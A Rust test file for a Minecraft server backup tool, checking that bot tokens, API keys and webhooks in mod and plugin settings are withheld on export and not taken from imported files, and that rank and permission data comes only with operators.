            r#"[{"name":"Notch","uuid":"069a79f4-44e9-4726-a5be-fca90e38aaf5","expiresOn":"2026-12-01 10:00:00 +0000"}]"#,
        ),
    ]);
    for (name, text) in files {
        let format = scanned_format(&path(name)).unwrap_or_else(|| panic!("{name} is read"));
        assert_eq!(find_credential(text, format), None, "{name}");
    }
    for (name, text) in fresh_credentials() {
        let Some(format) = scanned_format(&path(name)) else {
            assert!(super::secrets::withheld_by_name(&path(name)), "{name}");
            continue;
        };
        if super::secrets::withheld_by_name(&path(name)) {
            continue;
        }
        assert!(find_credential(&text, format).is_some(), "{name}");
    }
}

/// Credentials in settings files no list names (fresh mods' and plugins' files in the
/// shapes the named ones have, key and token files by their names, a file too big to
/// read) are withheld whatever "Include plugin settings" says, named in the answer's
/// `secrets_withheld` and the image's excludes; real defaults with their secrets empty
/// travel. The named mods of the last check are withheld by name even when empty.
#[tokio::test]
async fn credentials_found_by_their_names_never_leave() {
    let core = core().await;
    let owner = core.owner().await;
    let fresh = fresh_credentials();
    for (path, text) in &fresh {
        write(&core.root, &on_disk(path), text.as_bytes());
    }
    let plugin = "plugins/FreshShop/config.yml";
    write(
        &core.root,
        plugin,
        b"shop:\n  api-key: FRESH-PLUGIN-API-KEY\n",
    );
    // too big to read: withheld rather than sent unread
    let big = "config/huge-mod/settings.json";
    let mut huge = b"{\"a\": \"".to_vec();
    huge.extend(std::iter::repeat_n(b'x', (4 << 20) + 1));
    huge.extend_from_slice(b"\"}");
    write(&core.root, big, &huge);
    for (path, text) in DEFAULTS {
        write(&core.root, &on_disk(path), text.as_bytes());
    }
    // the named mods of the last check: withheld by name, even with nothing in them
    let named = [
        "config/discord-mc-chat.json",
        "config/discord-mc-chat-backup.json",
        "config/discord_mc_chat/config.yml",
        "config/mc2discord.toml",
        "mods/tebex/config.yml",
    ];
    for path in named {
        write(&core.root, path, b"token = \"\"\n");
    }
    let id = core.backup(&owner).await;
    for options in [json!({}), json!({ "include_plugin_data": true })] {
        let (reply, file) = core.export_file(&owner, &id, options.clone()).await;
        let left_out = names(&reply["left_out"]);
        let withheld = names(&reply["secrets_withheld"]);
        let mut expected: Vec<&str> = fresh.iter().map(|(p, _)| *p).collect();
        expected.push(big);
        for path in &expected {
            assert!(left_out.contains(&path.to_string()), "{path}: {reply}");
            assert!(withheld.contains(&path.to_string()), "{path}: {reply}");
        }
        // a plugin's settings are withheld with the plugins' folders, or for their key
        assert!(left_out.contains(&plugin.to_string()), "{reply}");
        assert_eq!(
            withheld.contains(&plugin.to_string()),
            options["include_plugin_data"] == true,
            "{reply}"
        );
        for path in named {
            assert!(left_out.contains(&path.to_string()), "{path}: {reply}");
        }
        for (path, _) in DEFAULTS {
            assert!(!left_out.contains(&path.to_string()), "{path}: {reply}");
        }
        for (name, bytes) in all_bytes(&file) {
            let text = String::from_utf8_lossy(&bytes);
            assert!(
                !text.contains("FRESH-"),
                "a credential in {name} ({options})"
            );
            assert!(!text.contains("FRESHwebhook"), "the webhook in {name}");
        }
        let opened = container::open(&file, &Limits::default()).unwrap();
        let excludes = lodestone_image::store::excludes::Excludes::new(&opened.image().excludes);
        for path in &expected {
            assert!(excludes.excludes(path, false), "{path} not in the excludes");
        }
        let carried = paths(opened.image());
        for (path, _) in DEFAULTS {
            assert!(carried.contains(path), "{path} not in {carried:?}");
        }
    }
}

/// A file from someone else that carries their credentials in settings no list names (a
/// bot token, a proxy secret, a store key, a webhook, one in a file over 1 MiB carried as
/// chunks) gives them nothing: not placed, named in `secrets_not_taken` and in the
/// creation's end message. Real defaults with empty secrets are placed. Permission mods'
/// data (FTB Ranks in a world's and the pack's settings, PermissionsEx, player-roles,
/// Command Aliases) comes only with the operators and is named among them.
#[tokio::test]
async fn a_senders_credentials_and_ranks_are_not_taken() {
    let core = core().await;
    let owner = core.owner().await;
    let mut big_token = b"{\"padding\": \"".to_vec();
    big_token.extend(std::iter::repeat_n(b'p', 2 << 20));
    big_token.extend_from_slice(b"\", \"discord\": {\"botToken\": \"SENDER-BIG-TOKEN\"}}");
    let mut big_clean = b"{\"padding\": \"".to_vec();
    big_clean.extend(std::iter::repeat_n(b'q', 2 << 20));
    big_clean.extend_from_slice(b"\", \"botToken\": \"\"}");
    let sender: Vec<(String, Vec<u8>)> = fresh_credentials()
        .into_iter()
        .map(|(path, text)| (path.replace("saves/world/", "saves/A/"), text.into_bytes()))
        .chain([
            ("config/big-bridge.json".to_string(), big_token.clone()),
            (
                "plugins/FreshShop/config.yml".to_string(),
                b"secret-key: SENDER-STORE\n".to_vec(),
            ),
        ])
        .collect();
    let defaults: Vec<(String, &str)> = DEFAULTS
        .iter()
        .map(|(path, text)| (path.replace("saves/world/", "saves/A/"), *text))
        .collect();
    let ranks = [
        "saves/A/serverconfig/ftbranks/ranks.snbt",
        "saves/A/serverconfig/ftbranks/players.snbt",
        "defaultconfigs/ftbranks/ranks.snbt",
        "plugins/PermissionsEx/permissions.yml",
        "config/roles.json",
        "config/commandaliases/aliases.json",
    ];
    let file = launcher_file(core.dir.path(), |data, content, store| {
        for image in [&mut *data, &mut *content] {
            image.producer.app = lodestone_image::manifest::App::Core;
            image.game.loader = lodestone_image::Loader::Vanilla;
            image.game.loader_version = None;
            image
                .entries
                .retain(|e| !e.path.as_str().starts_with("mods/"));
        }
        data.settings.server = Some(lodestone_image::settings::ServerSettings {
            flavour: Some(lodestone_image::settings::ServerFlavour::Paper),
            ..Default::default()
        });
        let object = |path: &str, bytes: &[u8]| {
            let stored = store.put_bytes(bytes).unwrap();
            lodestone_image::Entry::new(
                lodestone_image::CanonicalPath::new(path).unwrap(),
                bytes.len() as u64,
                stored.sha256,
                Source::Object {},
            )
        };
        for (path, bytes) in &sender {
            data.entries.push(object(path, bytes));
        }
        for (path, text) in &defaults {
            data.entries.push(object(path, text.as_bytes()));
        }
        data.entries
            .push(object("config/big-clean.json", &big_clean));
        for path in ranks {
            data.entries.push(object(
                path,
                b"{ sender: { power: 1000, permissions: { \"command.op\": true } } }\n",
            ));
        }
    });
    let (upload_id, summary) = core.upload_ok(&owner, &file).await;
    let secrets = names(&summary["secrets_not_taken"]);
    for (path, _) in &sender {
        assert!(secrets.contains(path), "{path}: {secrets:?}");
    }
    for (path, _) in &defaults {
        assert!(!secrets.contains(path), "{path}: {secrets:?}");
    }
    assert!(!secrets.contains(&"config/big-clean.json".to_string()));
    let operators = names(&summary["operators"]);
    for shown in [
        "saves/A/serverconfig/ftbranks/",
        "defaultconfigs/ftbranks/",
        "plugins/PermissionsEx/",
        "config/roles.json",
        "config/commandaliases",
    ] {
        assert!(
            operators.contains(&shown.to_string()),
            "{shown}: {operators:?}"
        );
    }
    assert!(summary["not_taken"]
        .as_array()
        .unwrap()
        .contains(&json!("operators")));
    let made = core
        .create_and_wait(
            &owner,
            json!({
                "upload_id": upload_id, "image": summary["image"], "name": "No tokens",
                "port": 25652
            }),
        )
        .await
        .unwrap();
    let disk = |path: &str| path.strip_prefix("saves/").unwrap_or(path).to_string();
    for (path, _) in &sender {
        assert!(!made.has(&disk(path)), "{path}");
    }
    for path in ranks {
        assert!(!made.has(&disk(path)), "{path}");
    }
    for (path, text) in &defaults {
        assert_eq!(made.read(&disk(path)), *text, "{path}");
    }
    assert!(made.has("config/big-clean.json"));
    for (path, bytes) in tree(&made.root) {
        let text = String::from_utf8_lossy(&bytes);
        assert!(!text.contains("FRESH-"), "a sender's credential in {path}");
        assert!(!text.contains("SENDER-"), "a sender's credential in {path}");
    }
    assert!(
        made.message.contains("a password or a token")
            && made.message.contains("config/chat-bridge.json"),
        "{}",
        made.message
    );
    drop(made);

    // with the operators, the ranks come too; the credentials still don't
    let (upload_id, summary) = core.upload_ok(&owner, &file).await;
    let made = core
        .create_and_wait(
            &owner,
            json!({
                "upload_id": upload_id, "image": summary["image"], "name": "With ranks",
                "port": 25653, "keep_operators": true
            }),
        )
        .await
        .unwrap();
    for path in ranks {
        assert!(made.has(&disk(path)), "{path}");
    }
    for (path, _) in &sender {
        assert!(!made.has(&disk(path)), "{path}");
    }
}
